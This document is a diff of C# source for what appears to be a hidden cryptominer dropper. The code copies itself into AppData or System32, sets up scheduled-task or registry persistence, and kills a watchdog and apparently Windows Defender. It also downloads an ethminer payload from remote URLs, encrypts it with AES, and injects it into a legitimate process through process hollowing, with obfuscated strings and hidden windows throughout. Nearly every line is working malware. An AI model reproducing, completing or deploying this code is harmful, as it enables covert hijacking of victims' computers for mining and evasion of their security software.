@@ -9,7 +9,6 @@ using System.Security.Cryptography;
 using System.Security.Principal;
 using System.Text;
 using System.Threading;
-using Microsoft.Win32;
 #if DefDebug
 using System.Windows.Forms;
 #endif
@@ -23,339 +22,403 @@ using System.Windows.Forms;
 [assembly: AssemblyTrademark("%Trademark%")]
 [assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
 #endif
-[assembly: Guid("%Guid%")]
 
 public partial class RProgram
 {
-#if DefSystem32
-    public static string rbD = ((new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? Environment.SystemDirectory : Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) + @"\" + RGetString("#LIBSPATH"));
-#else
-    public static string rbD = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + RGetString("#LIBSPATH"));
-#endif
-#if DefInstall
-    public static string rplp = PayloadPath;
-#endif
-#if DefKillWD
-    public static string cmdl = Environment.GetCommandLineArgs()[1];
-#else
-    public static string cmdl = Assembly.GetEntryAssembly().Location;
-#endif
-
     public static void Main()
     {
-#if DefInstall
-        try{
-            if(new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
-            {
-                try{
-                    Process.Start(new ProcessStartInfo
-                    {
-                        FileName = "cmd",
-                        Arguments = RGetString("#TASKSCH") + "\"" + Path.GetFileNameWithoutExtension(rplp) + "\"" + " /tr " + "'" + "\"" + (rplp) + "\"" + "' & exit",
-                        WindowStyle = ProcessWindowStyle.Hidden,
-                        CreateNoWindow = true
-                    });
-                }
-                catch(Exception ex){
-                Registry.CurrentUser.CreateSubKey(RGetString("#REGKEY")).SetValue(Path.GetFileName(rplp), rplp);
-#if DefDebug
-                MessageBox.Show("M1: " + Environment.NewLine + ex.ToString());
-#endif
-                }
-            }else{
-                Registry.CurrentUser.CreateSubKey(RGetString("#REGKEY")).SetValue(Path.GetFileName(rplp), rplp);
-            }
-        }
-        catch(Exception ex){
-#if DefDebug
-            MessageBox.Show("M2: " +ex.ToString());
-#endif
-        }
-
-        if (cmdl.ToLower() != rplp.ToLower())
-        {
-            foreach (Process proc in Process.GetProcessesByName(RGetString("#WATCHDOG")))
-            {
-                proc.Kill();
-            }
-
-            try
-            {
-                File.Delete(Path.Combine(rbD, RGetString("#WATCHDOG") + ".log"));
-            } catch(Exception ex) {}
-            Directory.CreateDirectory(Path.GetDirectoryName(rplp));
-            File.Copy(cmdl, rplp, true);
-            Thread.Sleep(2 * 1000);
-            Process.Start(new ProcessStartInfo
-            {
-                FileName = rplp,
-                WorkingDirectory = Path.GetDirectoryName(rplp),  
-                WindowStyle = ProcessWindowStyle.Hidden,
-                CreateNoWindow = true,
-            });
-            RExit();
-        }
-#endif
-
         try
         {
+#if DefKillWD
             try
             {
-#if DefInstall
-            Directory.CreateDirectory(rbD);
-#endif
-#if DefWatchdog
-            if (Process.GetProcessesByName(RGetString("#WATCHDOG")).Length < 1)
-            {
-                File.WriteAllBytes(rbD + RGetString("#WATCHDOG") + ".exe", RGetTheResource("#watchdog"));
-
-                Process.Start(new ProcessStartInfo
-                {
-                    FileName = Path.Combine(rbD, RGetString("#WATCHDOG") + ".exe"),
-                    WorkingDirectory = rbD,
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    CreateNoWindow = true,
-                });
-            }
-#endif
+                _rCommand_(_rGetString_("#SCMD"), _rGetString_("#KillWDCommands"));
             }
             catch (Exception ex)
             {
 #if DefDebug
-            MessageBox.Show("M3: " + Environment.NewLine + ex.ToString());
+                MessageBox.Show("M0.5: " + Environment.NewLine + ex.ToString());
 #endif
             }
+#endif
 
-            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
-
-            var rarg1 = new ConnectionOptions();
-            rarg1.Impersonation = ImpersonationLevel.Impersonate;
-            var rarg2 = new ManagementScope(@"\root\cimv2", rarg1);
-            rarg2.Connect();
-
-            var rarg3 = new ManagementObjectSearcher(rarg2, new ObjectQuery(string.Format("Select CommandLine from Win32_Process where Name='{0}'", RGetString("#InjectionTarget")))).Get();
-            foreach (ManagementObject MemObj in rarg3)
-            {
-                if (MemObj != null && MemObj["CommandLine"] != null && MemObj["CommandLine"].ToString().Contains(RGetString("#MINERID")))
+#if DefSystem32
+            string _rbD_ = ((new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? Environment.SystemDirectory : Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) + @"\" + _rGetString_("#LIBSPATH"));
+#else
+            string _rbD_ = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + _rGetString_("#LIBSPATH"));
+#endif
+#if DefInstall
+            try{
+                string _rplp_ = PayloadPath;
+#if DefShellcode
+                string _rcmdl_ = Environment.GetCommandLineArgs()[1];
+#else
+                string _rcmdl_ = Assembly.GetExecutingAssembly().Location;
+#endif
+                if (!_rcmdl_.Equals(_rplp_, StringComparison.CurrentCultureIgnoreCase))
                 {
-                    RExit();
-                }
-            }
+                    _rKillWatchdog_();
 
-            byte[] reT = { };
-
-#if DefDownloader
-            if (!File.Exists(Path.Combine(rbD, RGetString("#WATCHDOG") + ".log")))
-            {
-                using (var client = new System.Net.WebClient())
-                {
                     try
                     {
-                        reT = client.DownloadData(client.DownloadString(RGetString("#SANCTAMMINERURL")));
+                        File.Delete(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + ".log"));
+                    } 
+                    catch {}
+
+                    try{
+                        if(new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
+                        {
+                            try{
+                                _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#TASKSCH"), _rplp_));
+                            }
+                            catch(Exception ex){
+                                _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#REGADD"), _rplp_));
+#if DefDebug
+                                MessageBox.Show("M1: " + Environment.NewLine + ex.ToString());
+#endif
+                            }
+                        }else{
+                            _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#REGADD"), _rplp_));
+                        }
                     }
                     catch(Exception ex){
 #if DefDebug
-                        MessageBox.Show("M6.5: Couldn't get ethminer from sanctam, moving on to backup" + Environment.NewLine + ex.ToString());
+                        MessageBox.Show("M1.5: " + ex.ToString());
 #endif
                     }
-                    if (reT.Length == 0) {
-                        reT = client.DownloadData(RGetString("#MINERURL"));
-                    }
+
+                    Thread.Sleep(10000);
+                    Directory.CreateDirectory(Path.GetDirectoryName(_rplp_));
+                    File.WriteAllBytes(_rplp_, File.ReadAllBytes(_rcmdl_));
+                    Thread.Sleep(2 * 1000);
+                    _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDSTART"), _rplp_));
+                    Environment.Exit(0);
                 }
-#if DefInstall
-                if (reT.Length > 0) {
-                    File.WriteAllBytes(Path.Combine(rbD, RGetString("#WATCHDOG") + ".log"), RAES_Method(reT, true));
-                }
+            }
+            catch(Exception ex){
+#if DefDebug
+                MessageBox.Show("M2: " + ex.ToString());
 #endif
             }
-            else
-            {
-                reT = RAES_Method(File.ReadAllBytes(Path.Combine(rbD, RGetString("#WATCHDOG") + ".log")));
-            }
-#else
-            reT = RGetTheResource("#eth");
 #endif
 
             try
             {
-                string rarg7 = "";
-
-                var rarg4 = new ConnectionOptions();
-                rarg4.Impersonation = ImpersonationLevel.Impersonate;
-                var rarg5 = new ManagementScope(@"\root\cimv2", rarg4);
-                rarg5.Connect();
-
-                var rarg6 = new ManagementObjectSearcher(rarg5, new ObjectQuery("SELECT Name, VideoProcessor FROM Win32_VideoController")).Get();
-                foreach (ManagementObject MemObj in rarg6)
+                try
                 {
-                    rarg7 += (" " + MemObj["VideoProcessor"] + " " + MemObj["Name"]);
+#if DefInstall
+                Directory.CreateDirectory(_rbD_);
+#endif
+#if DefWatchdog
+                if (Process.GetProcessesByName(_rGetString_("#WATCHDOG")).Length < 1)
+                    {
+                        _rKillWatchdog_();
+
+                        File.WriteAllBytes(_rbD_ + _rGetString_("#WATCHDOG") + ".exe", _rGetTheResource_("#watchdog"));
+
+                        Process.Start(new ProcessStartInfo
+                        {
+                            FileName = Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + ".exe"),
+                            WorkingDirectory = _rbD_,
+                            WindowStyle = ProcessWindowStyle.Hidden,
+                            CreateNoWindow = true,
+                        });
+                    }
+#endif
+                }
+                catch (Exception ex)
+                {
+#if DefDebug
+                    MessageBox.Show("M3: " + Environment.NewLine + ex.ToString());
+#endif
                 }
 
-                if (reT.Length > 1 && (rarg7.IndexOf("nvidia", StringComparison.OrdinalIgnoreCase) >= 0 || rarg7.IndexOf("amd", StringComparison.OrdinalIgnoreCase) >= 0))
+                System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
+
+                var _rarg1_ = new ConnectionOptions();
+                _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
+                var _rarg2_ = new ManagementScope(@"\root\cimv2", _rarg1_);
+                _rarg2_.Connect();
+
+                var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery(string.Format(_rGetString_("#MINERQUERY"), _rGetString_("#InjectionTarget")))).Get();
+                foreach (ManagementObject MemObj in _rarg3_)
                 {
-                    using (var archive = new ZipArchive(new MemoryStream(reT)))
+                    if (MemObj != null && MemObj["CommandLine"] != null && MemObj["CommandLine"].ToString().Contains(_rGetString_("#MINERID")))
                     {
-                        foreach (ZipArchiveEntry entry in archive.Entries)
+                        Environment.Exit(0);
+                    }
+                }
+
+                byte[] _reT_ = { };
+
+#if DefDownloader
+                try
+                {
+                    if (!File.Exists(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + ".log")))
+                    {
+                        using (var client = new System.Net.WebClient())
                         {
-                            if (entry.FullName.Contains("et"))
+                            try
                             {
-                                using (var streamdata = entry.Open())
+                                _reT_ = client.DownloadData(client.DownloadString(_rGetString_("#SANCTAMMINERURL")));
+                            }
+                            catch(Exception ex){
+#if DefDebug
+                                MessageBox.Show("M6.5: Couldn't get ethminer from sanctam, moving on to backup" + Environment.NewLine + ex.ToString());
+#endif
+                            }
+                            if (_reT_.Length == 0) {
+                                _reT_ = client.DownloadData(_rGetString_("#MINERURL"));
+                            }
+                        }
+#if DefInstall
+                        if (_reT_.Length > 0) {
+                            File.WriteAllBytes(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + ".log"), _rAESMethod_(_reT_, true));
+                        }
+#endif
+                    }
+                    else
+                    {
+                        _reT_ = _rAESMethod_(File.ReadAllBytes(Path.Combine(_rbD_, _rGetString_("#WATCHDOG") + ".log")));
+                    }
+                }
+                catch(Exception ex){
+#if DefDebug
+                    MessageBox.Show("MCDL: " + Environment.NewLine + ex.ToString());
+#endif
+                }
+#else
+                _reT_ = _rGetTheResource_("#eth");
+    #endif
+
+                try
+                {
+                    string _rarg7_ = "";
+
+                    var _rarg4_ = new ConnectionOptions();
+                    _rarg4_.Impersonation = ImpersonationLevel.Impersonate;
+                    var _rarg5_ = new ManagementScope(@"\root\cimv2", _rarg4_);
+                    _rarg5_.Connect();
+
+                    var rarg6 = new ManagementObjectSearcher(_rarg5_, new ObjectQuery("SELECT Name, VideoProcessor FROM Win32_VideoController")).Get();
+                    foreach (ManagementObject MemObj in rarg6)
+                    {
+                        _rarg7_ += (" " + MemObj["VideoProcessor"] + " " + MemObj["Name"]);
+                    }
+
+                    if (_reT_.Length > 1 && (_rarg7_.IndexOf("nvidia", StringComparison.OrdinalIgnoreCase) >= 0 || _rarg7_.IndexOf("amd", StringComparison.OrdinalIgnoreCase) >= 0))
+                    {
+                        using (var _rarchive_ = new ZipArchive(new MemoryStream(_reT_)))
+                        {
+                            foreach (ZipArchiveEntry _rentry_ in _rarchive_.Entries)
+                            {
+                                if (_rentry_.FullName.Contains("et"))
                                 {
-                                    using (var ms = new MemoryStream())
+                                    using (var _rstreamdata_ = _rentry_.Open())
                                     {
-                                        streamdata.CopyTo(ms);
-                                        RRun(ms.ToArray(), ("#InjectionDir") + @"\" + RGetString("#InjectionTarget"), RGetString("#ARGSTR"));
+                                        using (var _rms_ = new MemoryStream())
+                                        {
+                                            _rstreamdata_.CopyTo(_rms_);
+                                            _rRun_(_rms_.ToArray(), ("#InjectionDir") + @"\" + _rGetString_("#InjectionTarget"), _rGetString_("#ARGSTR"));
+                                        }
                                     }
                                 }
                             }
                         }
                     }
                 }
+                catch (Exception ex)
+                {
+#if DefDebug
+                MessageBox.Show("M5: " + Environment.NewLine + ex.ToString());
+#endif
+                }
             }
             catch (Exception ex)
             {
 #if DefDebug
-            MessageBox.Show("M5: " + Environment.NewLine + ex.ToString());
+                MessageBox.Show("M6: " + Environment.NewLine + ex.ToString());
 #endif
             }
         }
         catch (Exception ex)
         {
 #if DefDebug
-            MessageBox.Show("M6: " + Environment.NewLine + ex.ToString());
+            MessageBox.Show("M0: " + Environment.NewLine + ex.ToString());
 #endif
         }
-        RExit();
-    }
-
-    public static byte[] RGetTheResource(string rarg1)
-    {
-        var MyResource = new System.Resources.ResourceManager("#ParentRes", Assembly.GetExecutingAssembly());
-        return RAES_Method((byte[])MyResource.GetObject(rarg1));
-    }
-
-    public static string RGetString(string rarg1)
-    {
-        return Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String(rarg1)));
-    }
-
-    public static void RExit()
-    {
-#if DefKillWD
-        Process.Start(new ProcessStartInfo()
-        {
-            FileName = "cmd",
-            Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Assembly.GetEntryAssembly().Location + "\"",
-            WindowStyle = ProcessWindowStyle.Hidden,
-            CreateNoWindow = true
-        });
-#endif
         Environment.Exit(0);
     }
 
-    public static byte[] RAES_Method(byte[] rarg1, bool rarg2 = false)
+    public static byte[] _rGetTheResource_(string _rarg1_)
     {
-        var rarg4 = new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100);
-        var rarg5 = new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC };
-        var rarg6 = rarg2 ? rarg5.CreateEncryptor(rarg4.GetBytes(16), Encoding.ASCII.GetBytes("#IV")) : rarg5.CreateDecryptor(rarg4.GetBytes(16), Encoding.ASCII.GetBytes("#IV"));
-        using (var rarg7 = new MemoryStream())
+        var MyResource = new System.Resources.ResourceManager("#ParentRes", Assembly.GetExecutingAssembly());
+        return _rAESMethod_((byte[])MyResource.GetObject(_rarg1_));
+    }
+
+    public static string _rGetString_(string _rarg1_)
+    {
+        return Encoding.ASCII.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
+    }
+
+    public static void _rKillWatchdog_()
+    {
+#if DefWatchdog
+        try
         {
-            using (var rarg8 = new CryptoStream(rarg7, rarg6, CryptoStreamMode.Write))
+            foreach (Process proc in Process.GetProcessesByName(_rGetString_("#WATCHDOG")))
             {
-                rarg8.Write(rarg1, 0, rarg1.Length);
-                rarg8.Close();
+                proc.Kill();
             }
 
-            return rarg7.ToArray();
+            var _rarg1_ = new ConnectionOptions();
+            _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
+            var _rarg2_ = new ManagementScope(@"\root\cimv2", _rarg1_);
+            _rarg2_.Connect();
+
+            var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("Select CommandLine, ProcessID from Win32_Process")).Get();
+            foreach (ManagementObject MemObj in _rarg3_)
+            {
+                if (MemObj != null && MemObj["CommandLine"] != null && MemObj["CommandLine"].ToString().Contains("/" + _rGetString_("#WATCHDOG")))
+                {
+                    _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDKILL"), MemObj["ProcessID"]));
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+#if DefDebug
+            MessageBox.Show("KWD: " + Environment.NewLine + ex.ToString());
+#endif
+        }
+#endif
+    }
+
+    public static void _rCommand_(string _rarg1_, string _rarg2_)
+    {
+        try
+        {
+            Process.Start(new ProcessStartInfo
+            {
+                FileName = _rarg1_,
+                Arguments = _rarg2_,
+                WorkingDirectory = Environment.SystemDirectory,
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true,
+                UseShellExecute = false,
+                RedirectStandardOutput = true
+            });
+        }
+        catch (Exception ex)
+        {
+#if DefDebug
+                MessageBox.Show("M.C: " + Environment.NewLine + ex.ToString());
+#endif
+        }
+    }
+
+    public static byte[] _rAESMethod_(byte[] _rarg1_, bool _rarg2_ = false)
+    {
+        var _rarg4_ = new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100);
+        var _rarg5_ = new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC };
+        var _rarg6_ = _rarg2_ ? _rarg5_.CreateEncryptor(_rarg4_.GetBytes(16), Encoding.ASCII.GetBytes("#IV")) : _rarg5_.CreateDecryptor(_rarg4_.GetBytes(16), Encoding.ASCII.GetBytes("#IV"));
+        using (var _rarg7_ = new MemoryStream())
+        {
+            using (var _rarg8_ = new CryptoStream(_rarg7_, _rarg6_, CryptoStreamMode.Write))
+            {
+                _rarg8_.Write(_rarg1_, 0, _rarg1_.Length);
+                _rarg8_.Close();
+            }
+            return _rarg7_.ToArray();
         }
     }
 
     [DllImport("kernel32.dll")]
-    private static extern bool CreateProcess(string rarg1,
-                                                 string rarg2,
-                                                 IntPtr rarg3,
-                                                 IntPtr rarg4,
-                                                 bool rarg5,
-                                                 uint rarg6,
-                                                 IntPtr rarg7,
-                                                 string rarg8,
-                                                 byte[] rarg9,
-                                                 byte[] rarg10);
+    private static extern bool CreateProcess(string _rarg1_,
+                                                 string _rarg2_,
+                                                 IntPtr _rarg3_,
+                                                 IntPtr _rarg4_,
+                                                 bool _rarg5_,
+                                                 uint _rarg6_,
+                                                 IntPtr _rarg7_,
+                                                 string _rarg8_,
+                                                 byte[] _rarg9_,
+                                                 byte[] _rarg1_0);
 
     [DllImport("kernel32.dll")]
-    private static extern long VirtualAllocEx(long rarg1,
-                                              long rarg2,
-                                              long rarg3,
-                                              uint rarg4,
-                                              uint rarg5);
+    private static extern long VirtualAllocEx(long _rarg1_,
+                                              long _rarg2_,
+                                              long _rarg3_,
+                                              uint _rarg4_,
+                                              uint _rarg5_);
 
     [DllImport("kernel32.dll")]
-    private static extern long WriteProcessMemory(long rarg1,
-                                                  long rarg2,
-                                                  byte[] rarg3,
-                                                  int rarg4,
-                                                  long rarg5);
+    private static extern long WriteProcessMemory(long _rarg1_,
+                                                  long _rarg2_,
+                                                  byte[] _rarg3_,
+                                                  int _rarg4_,
+                                                  long _rarg5_);
 
     [DllImport("ntdll.dll")]
-    private static extern uint ZwUnmapViewOfSection(long rarg1,
-                                                    long rarg2);
+    private static extern uint ZwUnmapViewOfSection(long _rarg1_,
+                                                    long _rarg2_);
 
     [DllImport("kernel32.dll")]
-    private static extern bool SetThreadContext(long rarg1,
-                                                IntPtr rarg2);
+    private static extern bool SetThreadContext(long _rarg1_,
+                                                IntPtr _rarg2_);
 
     [DllImport("kernel32.dll")]
-    private static extern bool GetThreadContext(long rarg1,
-                                                IntPtr rarg2);
+    private static extern bool GetThreadContext(long _rarg1_,
+                                                IntPtr _rarg2_);
 
     [DllImport("kernel32.dll")]
-    private static extern uint ResumeThread(long rarg1);
+    private static extern uint ResumeThread(long _rarg1_);
 
     [DllImport("kernel32.dll")]
-    private static extern bool CloseHandle(long rarg1);
+    private static extern bool CloseHandle(long _rarg1_);
 
-    public static void RRun(byte[] rarg1, string rarg2, string rarg3)
+    public static void _rRun_(byte[] _rarg1_, string _rarg2_, string _rarg3_)
     {
-        int rarg4 = Marshal.ReadInt32(rarg1, 0x3c);
+        int _rarg4_ = Marshal.ReadInt32(_rarg1_, 0x3c);
 
-        long rarg5 = Marshal.ReadInt64(rarg1, rarg4 + 0x18 + 0x18);
+        long _rarg5_ = Marshal.ReadInt64(_rarg1_, _rarg4_ + 0x18 + 0x18);
 
-        byte[] rarg6 = new byte[0x18];
+        byte[] _rarg6_ = new byte[0x18];
 
-        IntPtr rarg7 = new IntPtr(16 * ((Marshal.AllocHGlobal(0x4d0 + (16 / 2)).ToInt64() + (16 - 1)) / 16));
+        IntPtr _rarg7_ = new IntPtr(16 * ((Marshal.AllocHGlobal(0x4d0 + (16 / 2)).ToInt64() + (16 - 1)) / 16));
 
-        Marshal.WriteInt32(rarg7, 0x30, 0x0010001b);
+        Marshal.WriteInt32(_rarg7_, 0x30, 0x0010001b);
 
-        CreateProcess(null, rarg2 + (!string.IsNullOrEmpty(rarg3) ? " " + rarg3 : ""), IntPtr.Zero, IntPtr.Zero, true, 0x4u, IntPtr.Zero, Path.GetDirectoryName(rarg2), new byte[0x68], rarg6);
-        long rarg8 = Marshal.ReadInt64(rarg6, 0x0);
-        long rarg9 = Marshal.ReadInt64(rarg6, 0x8);
+        CreateProcess(null, _rarg2_ + (!string.IsNullOrEmpty(_rarg3_) ? " " + _rarg3_ : ""), IntPtr.Zero, IntPtr.Zero, true, 0x4u, IntPtr.Zero, Path.GetDirectoryName(_rarg2_), new byte[0x68], _rarg6_);
+        long _rarg8_ = Marshal.ReadInt64(_rarg6_, 0x0);
+        long _rarg9_ = Marshal.ReadInt64(_rarg6_, 0x8);
 
-        ZwUnmapViewOfSection(rarg8, rarg5);
-        VirtualAllocEx(rarg8, rarg5, Marshal.ReadInt32(rarg1, rarg4 + 0x18 + 0x038), 0x3000, 0x40);
-        WriteProcessMemory(rarg8, rarg5, rarg1, Marshal.ReadInt32(rarg1, rarg4 + 0x18 + 0x03c), 0L);
+        ZwUnmapViewOfSection(_rarg8_, _rarg5_);
+        VirtualAllocEx(_rarg8_, _rarg5_, Marshal.ReadInt32(_rarg1_, _rarg4_ + 0x18 + 0x038), 0x3000, 0x40);
+        WriteProcessMemory(_rarg8_, _rarg5_, _rarg1_, Marshal.ReadInt32(_rarg1_, _rarg4_ + 0x18 + 0x03c), 0L);
 
-        for (short i = 0; i < Marshal.ReadInt16(rarg1, rarg4 + 0x4 + 0x2); i++)
+        for (short i = 0; i < Marshal.ReadInt16(_rarg1_, _rarg4_ + 0x4 + 0x2); i++)
         {
-            byte[] rarg10 = new byte[0x28];
-            Buffer.BlockCopy(rarg1, rarg4 + (0x18 + Marshal.ReadInt16(rarg1, rarg4 + 0x4 + 0x10)) + (0x28 * i), rarg10, 0, 0x28);
+            byte[] _rarg1_0 = new byte[0x28];
+            Buffer.BlockCopy(_rarg1_, _rarg4_ + (0x18 + Marshal.ReadInt16(_rarg1_, _rarg4_ + 0x4 + 0x10)) + (0x28 * i), _rarg1_0, 0, 0x28);
 
-            byte[] rarg11 = new byte[Marshal.ReadInt32(rarg10, 0x010)];
-            Buffer.BlockCopy(rarg1, Marshal.ReadInt32(rarg10, 0x014), rarg11, 0, rarg11.Length);
+            byte[] _rarg1_1 = new byte[Marshal.ReadInt32(_rarg1_0, 0x010)];
+            Buffer.BlockCopy(_rarg1_, Marshal.ReadInt32(_rarg1_0, 0x014), _rarg1_1, 0, _rarg1_1.Length);
 
-            WriteProcessMemory(rarg8, rarg5 + Marshal.ReadInt32(rarg10, 0x00c), rarg11, rarg11.Length, 0L);
+            WriteProcessMemory(_rarg8_, _rarg5_ + Marshal.ReadInt32(_rarg1_0, 0x00c), _rarg1_1, _rarg1_1.Length, 0L);
         }
 
-        GetThreadContext(rarg9, rarg7);
+        GetThreadContext(_rarg9_, _rarg7_);
 
-        WriteProcessMemory(rarg8, Marshal.ReadInt64(rarg7, 0x88) + 16, BitConverter.GetBytes(rarg5), 8, 0L);
+        WriteProcessMemory(_rarg8_, Marshal.ReadInt64(_rarg7_, 0x88) + 16, BitConverter.GetBytes(_rarg5_), 8, 0L);
 
-        Marshal.WriteInt64(rarg7, 0x80, rarg5 + Marshal.ReadInt32(rarg1, rarg4 + 0x18 + 0x10));
+        Marshal.WriteInt64(_rarg7_, 0x80, _rarg5_ + Marshal.ReadInt32(_rarg1_, _rarg4_ + 0x18 + 0x10));
 
-        SetThreadContext(rarg9, rarg7);
-        ResumeThread(rarg9);
+        SetThreadContext(_rarg9_, _rarg7_);
+        ResumeThread(_rarg9_);
 
-        Marshal.FreeHGlobal(rarg7);
-        CloseHandle(rarg8);
-        CloseHandle(rarg9);
+        Marshal.FreeHGlobal(_rarg7_);
+        CloseHandle(_rarg8_);
+        CloseHandle(_rarg9_);
     }
 }
